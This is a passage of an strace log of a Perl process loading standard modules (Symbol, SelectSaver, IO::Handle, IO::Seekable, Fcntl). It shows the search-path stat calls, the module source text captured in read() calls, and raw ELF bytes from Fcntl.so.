$mode =~ s/^r(\\+?)$/$1</\n      or $mode =~ s/^w(\\+?)$/$1>/\n      or $mode =~ s/^a(\\+?)$/$1>>/\n      or croak \"IO::Handle: bad open mode: $mode\";\n    $mode;\n}\n\nsub fdopen {\n    @_ == 3 or croak \'usage: $io->fdopen(FD, MODE)\';\n    my ($io, $fd, $mode) = @_;\n    local(*GLOB);\n\n    if (ref($fd) && \"\".$fd =~ /GLOB\\(/o) {\n\t# It\'s a glob reference; Alias it as we cannot get name of anon GLOBs\n\tmy $n = qualify(*GLOB);\n\t*GLOB = *{*$fd};\n\t$fd =  $n;\n    } elsif ($fd =~ m#^\\d+$#) {\n\t# It\'s an FD number; prefix with \"=\".\n\t$fd = \"=$fd\";\n    }\n\n    open($io, _open_mode_string($mode) . \'&\' . $fd)\n\t? $io : undef;\n}\n\nsub close {\n    @_ == 1 or croak \'usage: $io->close()\';\n    my($io) = @_;\n\n    close($io);\n}\n\n################################################\n## Normal I/O functions.\n##\n\n# flock\n# select\n\nsub opened {\n    @_ == 1 or croak \'usage: $io->opened()\';\n    defined fileno($_[0]);\n}\n\nsub fileno {\n    @_ == 1 or croak \'usage: $io->fileno()\';\n    fileno($_[0]);\n}\n\nsub getc {\n    @_ == 1 or croak \'usage: $io->getc()\';\n    getc($_[0]);\n}\n\nsub eof {\n    @_ == 1 or croak \'usage: $io->eof()\';\n    eof($_[0]);\n}\n\nsub print {\n    @_ or croak \'usage: $io->print(ARGS)\';\n    my $this = shift;\n    print $this @_;\n}\n\nsub printf {\n    @_ >= 2 or croak \'usage: $io->printf(FMT,[ARGS])\';\n    my $this = shift;\n    printf $this @_;\n}\n\nsub getline {\n    @_ == 1 or croak \'usage: $io->getline()\';\n    my $this = shift;\n    return scalar <$this>;\n} \n\n*gets = \\&getline;  # deprecated\n\nsub getlines {\n    @_ == 1 or croak \'usage: $io->getlines()\';\n    wantarray or\n\tcroak \'Can\\\'t call $io->getlines in a scalar context, use $io->getline\';\n    my $this = shift;\n    return <$this>;\n}\n\nsub truncate {\n    @_ == 2 or croak \'usage: $io->truncate(LEN)\';\n    truncate($_[0], $_[1]);\n}\n\nsub read {\n    @_ == 3 || @_ == 4 or croak \'usage: $io->read(BUF, LEN [, OFFSET])\';\n    read($_[0], $_[1], $_[2], $_[3] || 0);\n}\n\nsub sysread {\n    @_ == 3 || @_ == 4 or croak \'usage: $io->sysread(BUF, LEN [, OFFSET])\';\n    sysread($_[0], $_[1], $_[2], $_[3] || 0);\n}\n\nsub write {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $io->write(BUF [, LEN [, OFFSET]])\';\n    local($\\) = \"\";\n    $_[2] = length($_[1]) unless defined $_[2];\n    print { $_[0] } substr($_[1], $_[3] || 0, $_[2]);\n}\n\nsub syswrite {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $io->syswrite(BUF [, LEN [, OFFSET]])\';\n    if (defined($_[2])) {\n\tsyswrite($_[0], $_[1], $_[2], $_[3] || 0);\n    } else {\n\tsyswrite($_[0], $_[1]);\n    }\n}\n\nsub stat {\n    @_ == 1 or croak \'u", 4096) = 4096
10104 20:03:03.118440 stat64("/etc/perl/Symbol.pmc", 0xbfa442ec) = -1 ENOENT (No such file or directory)
10104 20:03:03.118458 stat64("/etc/perl/Symbol.pm", 0xbfa441fc) = -1 ENOENT (No such file or directory)
10104 20:03:03.118472 stat64("/usr/local/lib/perl/5.8.8/Symbol.pmc", 0xbfa442ec) = -1 ENOENT (No such file or directory)
10104 20:03:03.118485 stat64("/usr/local/lib/perl/5.8.8/Symbol.pm", 0xbfa441fc) = -1 ENOENT (No such file or directory)
10104 20:03:03.118500 stat64("/usr/local/share/perl/5.8.8/Symbol.pmc", 0xbfa442ec) = -1 ENOENT (No such file or directory)
10104 20:03:03.118512 stat64("/usr/local/share/perl/5.8.8/Symbol.pm", 0xbfa441fc) = -1 ENOENT (No such file or directory)
10104 20:03:03.118527 stat64("/usr/lib/perl5/Symbol.pmc", 0xbfa442ec) = -1 ENOENT (No such file or directory)
10104 20:03:03.118539 stat64("/usr/lib/perl5/Symbol.pm", 0xbfa441fc) = -1 ENOENT (No such file or directory)
10104 20:03:03.118553 stat64("/usr/share/perl5/Symbol.pmc", 0xbfa442ec) = -1 ENOENT (No such file or directory)
10104 20:03:03.118564 stat64("/usr/share/perl5/Symbol.pm", 0xbfa441fc) = -1 ENOENT (No such file or directory)
10104 20:03:03.118578 stat64("/usr/lib/perl/5.8/Symbol.pmc", 0xbfa442ec) = -1 ENOENT (No such file or directory)
10104 20:03:03.118590 stat64("/usr/lib/perl/5.8/Symbol.pm", 0xbfa441fc) = -1 ENOENT (No such file or directory)
10104 20:03:03.118604 stat64("/usr/share/perl/5.8/Symbol.pmc", 0xbfa442ec) = -1 ENOENT (No such file or directory)
10104 20:03:03.118617 stat64("/usr/share/perl/5.8/Symbol.pm", {st_mode=S_IFREG|0644, st_size=2099, ...}) = 0
10104 20:03:03.118638 open("/usr/share/perl/5.8/Symbol.pm", O_RDONLY|O_LARGEFILE) = 8
10104 20:03:03.118653 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfa44008) = -1 ENOTTY (Inappropriate ioctl for device)
10104 20:03:03.118665 _llseek(8, 0, [0], SEEK_CUR) = 0
10104 20:03:03.118682 read(8, "package Symbol;\n\nBEGIN { require 5.005; }\n\nrequire Exporter;\n@ISA = qw(Exporter);\n@EXPORT = qw(gensym ungensym qualify qualify_to_ref);\n@EXPORT_OK = qw(delete_package geniosym);\n\n$VERSION = \'1.06\';\n\nmy $genpkg = \"Symbol::\";\nmy $genseq = 0;\n\nmy %global = map {$_ => 1} qw(ARGV ARGVOUT ENV INC SIG STDERR STDIN STDOUT);\n\n#\n# Note that we never _copy_ the glob; we just make a ref to it.\n# If we did copy it, then SVf_FAKE would be set on the copy, and\n# glob-specific behaviors (e.g. C<*$ref = \\&func>) wouldn\'t work.\n#\nsub gensym () {\n    my $name = \"GEN\" . $genseq++;\n    my $ref = \\*{$genpkg . $name};\n    delete $$genpkg{$name};\n    $ref;\n}\n\nsub geniosym () {\n    my $sym = gensym();\n    # force the IO slot to be filled\n    select(select $sym);\n    *$sym{IO};\n}\n\nsub ungensym ($) {}\n\nsub qualify ($;$) {\n    my ($name) = @_;\n    if (!ref($name) && index($name, \'::\') == -1 && index($name, \"\'\") == -1) {\n\tmy $pkg;\n\t# Global names: special character, \"^xyz\", or other. \n\tif ($name =~ /^(([^a-z])|(\\^[a-z_]+))\\z/i || $global{$name}) {\n\t    # RGS 2001-11-05 : translate leading ^X to control-char\n\t    $name =~ s/^\\^([a-z_])/\'qq(\\c\'.$1.\')\'/eei;\n\t    $pkg = \"main\";\n\t}\n\telse {\n\t    $pkg = (@_ > 1) ? $_[1] : caller;\n\t}\n\t$name = $pkg . \"::\" . $name;\n    }\n    $name;\n}\n\nsub qualify_to_ref ($;$) {\n    return \\*{ qualify $_[0], @_ > 1 ? $_[1] : caller };\n}\n\n#\n# of Safe.pm lineage\n#\nsub delete_package ($) {\n    my $pkg = shift;\n\n    # expand to full symbol table name if needed\n\n    unless ($pkg =~ /^main::.*::$/) {\n        $pkg = \"main$pkg\"\tif\t$pkg =~ /^::/;\n        $pkg = \"main::$pkg\"\tunless\t$pkg =~ /^main::/;\n        $pkg .= \'::\'\t\tunless\t$pkg =~ /::$/;\n    }\n\n    my($stem, $leaf) = $pkg =~ m/(.*::)(\\w+::)$/;\n    my $stem_symtab = *{$stem}{HASH};\n    return unless defined $stem_symtab and exists $stem_symtab->{$leaf};\n\n    # free all the symbols in the package\n\n    my $leaf_symtab = *{$stem_symtab->{$leaf}}{HASH};\n    foreach my $name (keys %$leaf_symtab) {\n        undef *{$pkg . $name};\n    }\n\n    # delete the symbol table\n\n    %$leaf_symtab = ();\n    delete $stem_symtab->{$leaf};\n}\n\n1;\n", 4096) = 2099
10104 20:03:03.119204 read(8, "", 4096) = 0
10104 20:03:03.236980 close(8)          = 0
10104 20:03:03.237115 stat64("/etc/perl/SelectSaver.pmc", 0xbfa442ec) = -1 ENOENT (No such file or directory)
10104 20:03:03.237138 stat64("/etc/perl/SelectSaver.pm", 0xbfa441fc) = -1 ENOENT (No such file or directory)
10104 20:03:03.237153 stat64("/usr/local/lib/perl/5.8.8/SelectSaver.pmc", 0xbfa442ec) = -1 ENOENT (No such file or directory)
10104 20:03:03.237168 stat64("/usr/local/lib/perl/5.8.8/SelectSaver.pm", 0xbfa441fc) = -1 ENOENT (No such file or directory)
10104 20:03:03.237184 stat64("/usr/local/share/perl/5.8.8/SelectSaver.pmc", 0xbfa442ec) = -1 ENOENT (No such file or directory)
10104 20:03:03.237198 stat64("/usr/local/share/perl/5.8.8/SelectSaver.pm", 0xbfa441fc) = -1 ENOENT (No such file or directory)
10104 20:03:03.237226 stat64("/usr/lib/perl5/SelectSaver.pmc", 0xbfa442ec) = -1 ENOENT (No such file or directory)
10104 20:03:03.237239 stat64("/usr/lib/perl5/SelectSaver.pm", 0xbfa441fc) = -1 ENOENT (No such file or directory)
10104 20:03:03.237253 stat64("/usr/share/perl5/SelectSaver.pmc", 0xbfa442ec) = -1 ENOENT (No such file or directory)
10104 20:03:03.237266 stat64("/usr/share/perl5/SelectSaver.pm", 0xbfa441fc) = -1 ENOENT (No such file or directory)
10104 20:03:03.237279 stat64("/usr/lib/perl/5.8/SelectSaver.pmc", 0xbfa442ec) = -1 ENOENT (No such file or directory)
10104 20:03:03.237293 stat64("/usr/lib/perl/5.8/SelectSaver.pm", 0xbfa441fc) = -1 ENOENT (No such file or directory)
10104 20:03:03.237308 stat64("/usr/share/perl/5.8/SelectSaver.pmc", 0xbfa442ec) = -1 ENOENT (No such file or directory)
10104 20:03:03.237322 stat64("/usr/share/perl/5.8/SelectSaver.pm", {st_mode=S_IFREG|0644, st_size=340, ...}) = 0
10104 20:03:03.237813 open("/usr/share/perl/5.8/SelectSaver.pm", O_RDONLY|O_LARGEFILE) = 8
10104 20:03:03.237863 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfa44008) = -1 ENOTTY (Inappropriate ioctl for device)
10104 20:03:03.237886 _llseek(8, 0, [0], SEEK_CUR) = 0
10104 20:03:03.237911 read(8, "package SelectSaver;\n\nour $VERSION = \'1.01\';\n\nrequire 5.000;\nuse Carp;\nuse Symbol;\n\nsub new {\n    @_ >= 1 && @_ <= 2 or croak \'usage: new SelectSaver [FILEHANDLE]\';\n    my $fh = select;\n    my $self = bless \\$fh, $_[0];\n    select qualify($_[1], caller) if @_ > 1;\n    $self;\n}\n\nsub DESTROY {\n    my $self = $_[0];\n    select $$self;\n}\n\n1;\n", 4096) = 340
10104 20:03:03.238065 brk(0x81d6000)    = 0x81d6000
10104 20:03:03.238101 read(8, "", 4096) = 0
10104 20:03:03.238114 close(8)          = 0
10104 20:03:03.238601 read(6, "sage: $io->stat()\';\n    stat($_[0]);\n}\n\n################################################\n## State modification functions.\n##\n\nsub autoflush {\n    my $old = new SelectSaver qualify($_[0], caller);\n    my $prev = $|;\n    $| = @_ > 1 ? $_[1] : 1;\n    $prev;\n}\n\nsub output_field_separator {\n    carp \"output_field_separator is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $,;\n    $, = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub output_record_separator {\n    carp \"output_record_separator is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $\\;\n    $\\ = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub input_record_separator {\n    carp \"input_record_separator is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $/;\n    $/ = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub input_line_number {\n    local $.;\n    () = tell qualify($_[0], caller) if ref($_[0]);\n    my $prev = $.;\n    $. = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_page_number {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $%;\n    $% = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_lines_per_page {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $=;\n    $= = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_lines_left {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $-;\n    $- = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_name {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $~;\n    $~ = qualify($_[1], caller) if @_ > 1;\n    $prev;\n}\n\nsub format_top_name {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $^;\n    $^ = qualify($_[1], caller) if @_ > 1;\n    $prev;\n}\n\nsub format_line_break_characters {\n    carp \"format_line_break_characters is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $:;\n    $: = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_formfeed {\n    carp \"format_formfeed is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $^L;\n    $^L = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub formline {\n    my $io = shift;\n    my $picture = shift;\n    local($^A) = $^A;\n    local($\\) = \"\";\n    formline($picture, @_);\n    print $io $^A;\n}\n\nsub format_write {\n    @_ < 3 || croak \'usage: $io->write( [FORMAT_NAME] )\';\n    if (@_ == 2) {\n\tmy ($io, $fmt) = @_;\n\tmy $oldfmt = $io->format_name($fmt);\n\tCORE::write($io);\n\t$io->format_name($oldfmt);\n    } else {\n\tCORE::write($_[0]);\n    }\n}\n\n# XXX undocumented\nsub fcntl {\n    @_ == 3 || croak \'usage: $io->fcntl( OP, VALUE );\';\n    my ($io, $op) = @_;\n    return fcntl($io, $op, $_[2]);\n}\n\n# XXX undocumented\nsub ioctl {\n    @_ == 3 || croak \'usage: $io->ioctl( OP, VALUE );\';\n    my ($io, $op) = @_;\n    return ioctl($io, $op, $_[2]);\n}\n\n# this sub is for compatability with older releases of IO that used\n# a sub called constant to detemine if a constant existed -- GMB\n#\n# The SEEK_* and _IO?BF constants were the only constants at that time\n# any new code should just chech defined(&CONSTANT_NAME)\n\nsub constant {\n    no strict \'refs\';\n    my $name = shift;\n    (($name =~ /^(SEEK_(SET|CUR|END)|_IO[FLN]BF)$/) && defined &{$name})\n\t? &{$name}() : undef;\n}\n\n# so that flush.pl can be deprecated\n\nsub printflush {\n    my $io = shift;\n    my $old;\n    $old = new SelectSaver qualify($io, caller) if ref($io);\n    local $| = 1;\n    if(ref($io)) {\n        print $io @_;\n    }\n    else {\n\tprint @_;\n    }\n}\n\n1;\n", 4096) = 3496
10104 20:03:03.239274 read(6, "", 4096) = 0
10104 20:03:03.239292 close(6)          = 0
10104 20:03:03.239334 stat64("/etc/perl/IO/Seekable.pmc", 0xbfa4479c) = -1 ENOENT (No such file or directory)
10104 20:03:03.239383 stat64("/etc/perl/IO/Seekable.pm", 0xbfa446ac) = -1 ENOENT (No such file or directory)
10104 20:03:03.239413 stat64("/usr/local/lib/perl/5.8.8/IO/Seekable.pmc", 0xbfa4479c) = -1 ENOENT (No such file or directory)
10104 20:03:03.239427 stat64("/usr/local/lib/perl/5.8.8/IO/Seekable.pm", 0xbfa446ac) = -1 ENOENT (No such file or directory)
10104 20:03:03.239442 stat64("/usr/local/share/perl/5.8.8/IO/Seekable.pmc", 0xbfa4479c) = -1 ENOENT (No such file or directory)
10104 20:03:03.239455 stat64("/usr/local/share/perl/5.8.8/IO/Seekable.pm", 0xbfa446ac) = -1 ENOENT (No such file or directory)
10104 20:03:03.239470 stat64("/usr/lib/perl5/IO/Seekable.pmc", 0xbfa4479c) = -1 ENOENT (No such file or directory)
10104 20:03:03.239482 stat64("/usr/lib/perl5/IO/Seekable.pm", 0xbfa446ac) = -1 ENOENT (No such file or directory)
10104 20:03:03.239496 stat64("/usr/share/perl5/IO/Seekable.pmc", 0xbfa4479c) = -1 ENOENT (No such file or directory)
10104 20:03:03.239509 stat64("/usr/share/perl5/IO/Seekable.pm", 0xbfa446ac) = -1 ENOENT (No such file or directory)
10104 20:03:03.239522 stat64("/usr/lib/perl/5.8/IO/Seekable.pmc", 0xbfa4479c) = -1 ENOENT (No such file or directory)
10104 20:03:03.239541 stat64("/usr/lib/perl/5.8/IO/Seekable.pm", {st_mode=S_IFREG|0644, st_size=686, ...}) = 0
10104 20:03:03.240185 open("/usr/lib/perl/5.8/IO/Seekable.pm", O_RDONLY|O_LARGEFILE) = 6
10104 20:03:03.417017 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfa444b8) = -1 ENOTTY (Inappropriate ioctl for device)
10104 20:03:03.417038 _llseek(6, 0, [0], SEEK_CUR) = 0
10104 20:03:03.417072 read(6, "#\n\npackage IO::Seekable;\n\nuse 5.006_001;\nuse Carp;\nuse strict;\nour($VERSION, @EXPORT, @ISA);\nuse IO::Handle ();\n# XXX we can\'t get these from IO::Handle or we\'ll get prototype\n# mismatch warnings on C<use POSIX; use IO::File;> :-(\nuse Fcntl qw(SEEK_SET SEEK_CUR SEEK_END);\nrequire Exporter;\n\n@EXPORT = qw(SEEK_SET SEEK_CUR SEEK_END);\n@ISA = qw(Exporter);\n\n$VERSION = \"1.10\";\n$VERSION = eval $VERSION;\n\nsub seek {\n    @_ == 3 or croak \'usage: $io->seek(POS, WHENCE)\';\n    seek($_[0], $_[1], $_[2]);\n}\n\nsub sysseek {\n    @_ == 3 or croak \'usage: $io->sysseek(POS, WHENCE)\';\n    sysseek($_[0], $_[1], $_[2]);\n}\n\nsub tell {\n    @_ == 1 or croak \'usage: $io->tell()\';\n    tell($_[0]);\n}\n\n1;\n", 4096) = 686
10104 20:03:03.417253 stat64("/etc/perl/Fcntl.pmc", 0xbfa442ec) = -1 ENOENT (No such file or directory)
10104 20:03:03.417271 stat64("/etc/perl/Fcntl.pm", 0xbfa441fc) = -1 ENOENT (No such file or directory)
10104 20:03:03.417285 stat64("/usr/local/lib/perl/5.8.8/Fcntl.pmc", 0xbfa442ec) = -1 ENOENT (No such file or directory)
10104 20:03:03.417299 stat64("/usr/local/lib/perl/5.8.8/Fcntl.pm", 0xbfa441fc) = -1 ENOENT (No such file or directory)
10104 20:03:03.417313 stat64("/usr/local/share/perl/5.8.8/Fcntl.pmc", 0xbfa442ec) = -1 ENOENT (No such file or directory)
10104 20:03:03.417327 stat64("/usr/local/share/perl/5.8.8/Fcntl.pm", 0xbfa441fc) = -1 ENOENT (No such file or directory)
10104 20:03:03.417341 stat64("/usr/lib/perl5/Fcntl.pmc", 0xbfa442ec) = -1 ENOENT (No such file or directory)
10104 20:03:03.417353 stat64("/usr/lib/perl5/Fcntl.pm", 0xbfa441fc) = -1 ENOENT (No such file or directory)
10104 20:03:03.417367 stat64("/usr/share/perl5/Fcntl.pmc", 0xbfa442ec) = -1 ENOENT (No such file or directory)
10104 20:03:03.417390 stat64("/usr/share/perl5/Fcntl.pm", 0xbfa441fc) = -1 ENOENT (No such file or directory)
10104 20:03:03.417435 stat64("/usr/lib/perl/5.8/Fcntl.pmc", 0xbfa442ec) = -1 ENOENT (No such file or directory)
10104 20:03:03.417463 stat64("/usr/lib/perl/5.8/Fcntl.pm", {st_mode=S_IFREG|0644, st_size=3458, ...}) = 0
10104 20:03:03.417487 open("/usr/lib/perl/5.8/Fcntl.pm", O_RDONLY|O_LARGEFILE) = 8
10104 20:03:03.417503 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfa44008) = -1 ENOTTY (Inappropriate ioctl for device)
10104 20:03:03.417515 _llseek(8, 0, [0], SEEK_CUR) = 0
10104 20:03:03.417551 read(8, "package Fcntl;\n\nour($VERSION, @ISA, @EXPORT, @EXPORT_OK, %EXPORT_TAGS, $AUTOLOAD);\n\nrequire Exporter;\nuse XSLoader ();\n@ISA = qw(Exporter);\n$VERSION = \"1.05\";\n# Items to export into callers namespace by default\n# (move infrequently used names to @EXPORT_OK below)\n@EXPORT =\n  qw(\n\tFD_CLOEXEC\n\tF_ALLOCSP\n\tF_ALLOCSP64\n\tF_COMPAT\n\tF_DUP2FD\n\tF_DUPFD\n\tF_EXLCK\n\tF_FREESP\n\tF_FREESP64\n\tF_FSYNC\n\tF_FSYNC64\n\tF_GETFD\n\tF_GETFL\n\tF_GETLK\n\tF_GETLK64\n\tF_GETOWN\n\tF_NODNY\n\tF_POSIX\n\tF_RDACC\n\tF_RDDNY\n\tF_RDLCK\n\tF_RWACC\n\tF_RWDNY\n\tF_SETFD\n\tF_SETFL\n\tF_SETLK\n\tF_SETLK64\n\tF_SETLKW\n\tF_SETLKW64\n\tF_SETOWN\n\tF_SHARE\n\tF_SHLCK\n\tF_UNLCK\n\tF_UNSHARE\n\tF_WRACC\n\tF_WRDNY\n\tF_WRLCK\n\tO_ACCMODE\n\tO_ALIAS\n\tO_APPEND\n\tO_ASYNC\n\tO_BINARY\n\tO_CREAT\n\tO_DEFER\n\tO_DIRECT\n\tO_DIRECTORY\n\tO_DSYNC\n\tO_EXCL\n\tO_EXLOCK\n\tO_LARGEFILE\n\tO_NDELAY\n\tO_NOCTTY\n\tO_NOFOLLOW\n\tO_NOINHERIT\n\tO_NONBLOCK\n\tO_RANDOM\n\tO_RAW\n\tO_RDONLY\n\tO_RDWR\n\tO_RSRC\n\tO_RSYNC\n\tO_SEQUENTIAL\n\tO_SHLOCK\n\tO_SYNC\n\tO_TEMPORARY\n\tO_TEXT\n\tO_TRUNC\n\tO_WRONLY\n     );\n\n# Other items we are prepared to export if requested\n@EXPORT_OK = qw(\n\tDN_ACCESS\n\tDN_ATTRIB\n\tDN_CREATE\n\tDN_DELETE\n\tDN_MODIFY\n\tDN_MULTISHOT\n\tDN_RENAME\n\tFAPPEND\n\tFASYNC\n\tFCREAT\n\tFDEFER\n\tFDSYNC\n\tFEXCL\n\tFLARGEFILE\n\tFNDELAY\n\tFNONBLOCK\n\tFRSYNC\n\tFSYNC\n\tFTRUNC\n\tF_GETLEASE\n\tF_GETSIG\n\tF_NOTIFY\n\tF_SETLEASE\n\tF_SETSIG\n\tLOCK_EX\n\tLOCK_MAND\n\tLOCK_NB\n\tLOCK_READ\n\tLOCK_RW\n\tLOCK_SH\n\tLOCK_UN\n\tLOCK_WRITE\n\tO_IGNORE_CTTY\n\tO_NOATIME\n\tO_NOLINK\n\tO_NOTRANS\n\tSEEK_CUR\n\tSEEK_END\n\tSEEK_SET\n\tS_IFSOCK S_IFBLK S_IFCHR S_IFIFO S_IFWHT S_ENFMT\n\tS_IREAD S_IWRITE S_IEXEC\n\tS_IRGRP S_IWGRP S_IXGRP S_IRWXG\n\tS_IROTH S_IWOTH S_IXOTH S_IRWXO\n\tS_IRUSR S_IWUSR S_IXUSR S_IRWXU\n\tS_ISUID S_ISGID S_ISVTX S_ISTXT\n\t_S_IFMT S_IFREG S_IFDIR S_IFLNK\n\t&S_ISREG &S_ISDIR &S_ISLNK &S_ISSOCK &S_ISBLK &S_ISCHR &S_ISFIFO\n\t&S_ISWHT &S_ISENFMT &S_IFMT &S_IMODE\n);\n# Named groups of exports\n%EXPORT_TAGS = (\n    \'flock\'   => [qw(LOCK_SH LOCK_EX LOCK_NB LOCK_UN)],\n    \'Fcompat\' => [qw(FAPPEND FASYNC FCREAT FDEFER FDSYNC FEXCL FLARGEFILE\n\t\t     FNDELAY FNONBLOCK FRSYNC FSYNC FTRUNC)],\n    \'seek\'    => [qw(SEEK_SET SEEK_CUR SEEK_END)],\n    \'mode\'    => [qw(S_ISUID S_ISGID S_ISVTX S_ISTXT\n\t\t     _S_IFMT S_IFREG S_IFDIR S_IFLNK\n\t\t     S_IFSOCK S_IFBLK S_IFCHR S_IFIFO S_IFWHT S_ENFMT\n\t\t     S_IRUSR S_IWUSR S_IXUSR S_IRWXU\n\t\t     S_IRGRP S_IWGRP S_IXGRP S_IRWXG\n\t\t     S_IROTH S_IWOTH S_IXOTH S_IRWXO\n\t\t     S_IREAD S_IWRITE S_IEXEC\n\t\t     S_ISREG S_ISDIR S_ISLNK S_ISSOCK\n\t\t     S_ISBLK S_ISCHR S_ISFIFO\n\t\t     S_ISWHT S_ISENFMT\t\t\n\t\t     S_IFMT S_IMODE\n                  )],\n);\n\nsub S_IFMT  { @_ ? ( $_[0] & _S_IFMT() ) : _S_IFMT()  }\nsub S_IMODE { $_[0] & 07777 }\n\nsub S_ISREG    { ( $_[0] & _S_IFMT() ) == S_IFREG()   }\nsub S_ISDIR    { ( $_[0] & _S_IFMT() ) == S_IFDIR()   }\nsub S_ISLNK    { ( $_[0] & _S_IFMT() ) == S_IFLNK()   }\nsub S_ISSOCK   { ( $_[0] & _S_IFMT() ) == S_IFSOCK()  }\nsub S_ISBLK    { ( $_[0] & _S_IFMT() ) == S_IFBLK()   }\nsub S_ISCHR    { ( $_[0] & _S_IFMT() ) == S_IFCHR()   }\nsub S_ISFIFO   { ( $_[0] & _S_IFMT() ) == S_IFIFO()   }\nsub S_ISWHT    { ( $_[0] & _S_IFMT() ) == S_IFWHT()   }\nsub S_ISENFMT  { ( $_[0] & _S_IFMT() ) == S_IFENFMT() }\n\nsub AUTOLOAD {\n    (my $constname = $AUTOLOAD) =~ s/.*:://;\n    die \"&Fcntl::constant not defined\" if $constname eq \'constant\';\n    my ($error, $val) = constant($constname);\n    if ($error) {\n        my (undef,$file,$line) = caller;\n        die \"$error at $file line $line.\\n\";\n    }\n    *$AUTOLOAD = sub { $val };\n    goto &$AUTOLOAD;\n}\n\nXSLoader::load \'Fcntl\', $VERSION;\n\n1;\n", 4096) = 3458
10104 20:03:03.418194 brk(0x81f7000)    = 0x81f7000
10104 20:03:03.418386 read(8, "", 4096) = 0
10104 20:03:03.418402 close(8)          = 0
10104 20:03:03.418519 stat64("/usr/lib/perl/5.8/auto/Fcntl/Fcntl.so", {st_mode=S_IFREG|0644, st_size=12412, ...}) = 0
10104 20:03:03.418561 stat64("/usr/lib/perl/5.8/auto/Fcntl/Fcntl.bs", {st_mode=S_IFREG|0644, st_size=0, ...}) = 0
10104 20:03:03.418591 open("/usr/lib/perl/5.8/auto/Fcntl/Fcntl.so", O_RDONLY) = 8
10104 20:03:03.418606 read(8, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0 \10\0\0004\0\0\0\274,\0\0\0\0\0\0004\0 \0\4\0(\0\30\0\27\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\274*\0\0\274*\0\0\5\0\0\0\0\20\0\0\1\0\0\0\274*\0\0\274:\0\0\274:\0\0T\1\0\0X\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\320*\0\0\320:\0\0\320:\0\0\310\0\0\0\310\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0\21\0\0\0\36\0\0\0\0\0\0\0\25\0\0\0\32\0\0\0\24\0\0\0\5\0\0\0\t\0\0\0\0\0\0\0\23\0\0\0\21\0\0\0\34\0\0\0\4\0\0\0\26\0\0\0\0\0\0\0\30\0\0\0\17\0\0\0\27\0\0\0\r\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\1\0\0\0\0\0\0\0\3\0\0\0\2\0\0\0\0\0\0\0\0\0\0\0\v\0\0\0\6\0\0\0\35\0\0\0\7\0\0\0\0\0\0\0\22\0\0\0\31\0\0\0\33\0\0\0\20\0\0\0\16\0\0\0\n\0\0\0\0\0\0\0\f\0\0\0\10\0\0\0\0\0\0\0\3\0\0\0\27\0\0\0\2\0\0\0\6\0\0\0\210\0 \1\0\304H\t\27\0\0\0\32\0\0\0\35\0\0\0\356TU\220\272\343\222|CE\325\354.6bx\330qX\34\271\215\361\16\353\323\357\16\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\353\0\0\0\0\0\0\0\0\0\0\0\20\0\0\0j\1\0\0\0\0\0\0\0\0\0\0\20\0\0\0\337\0\0\0\0\0\0\0\0\0\0\0\20\0\0\0u\0\0\0\0\0\0\0", 512) = 512
10104 20:03:03.418702 fstat64(8, {st_mode=S_IFREG|0644, st_size=12412, ...}) = 0
10104 20:03:03.418721 mmap2(NULL, 15380, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 8, 0) = 0xb7da1000
10104 20:03:03.418736 mmap2(0xb7da4000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 8, 0x2) = 0xb7da4000
10104 20:03:03.418752 close(8)          = 0
10104 20:03:03.419023 read(6, "", 4096) = 0
10104 20:03:03.419039 close(6)          = 0
10104 20:03:03.419073 stat64("/etc/perl/IO/File.pmc", 0xbfa4479c) = -1 ENOENT (No such file or directory)
10104 20:03:03.419089 stat64("/etc/perl/IO/File.pm", 0xbfa446ac) = -1 ENOENT (No such file or directory)
10104 20:03:03.419103 stat64("/usr/local/lib/perl/5.8.8/IO/File.pmc", 0xbfa4479c) = -1 ENOENT (No such file or directory)
10104 20:03:03.419117 stat64("/usr/local/lib/perl/5.8.8/IO/File.pm", 0xbfa446ac) = -1 ENOENT (No such file or directory)
10104 20:03:03.419131 stat64("/usr/local/share/perl/5.8.8/IO/File.pmc", 0xbfa4479c) = -1 ENOENT (No such file or directory)
10104 20:03:03.419145 stat64("/usr/local/share/perl/5.8.8/IO/File.pm", 0xbfa446ac) = -1 ENOENT (No such file or directory)
10104 20:03:03.419159 stat64("/usr/lib/perl5/IO/File.pmc", 0xbfa4479c) = -1 ENOENT (No such file or directory)
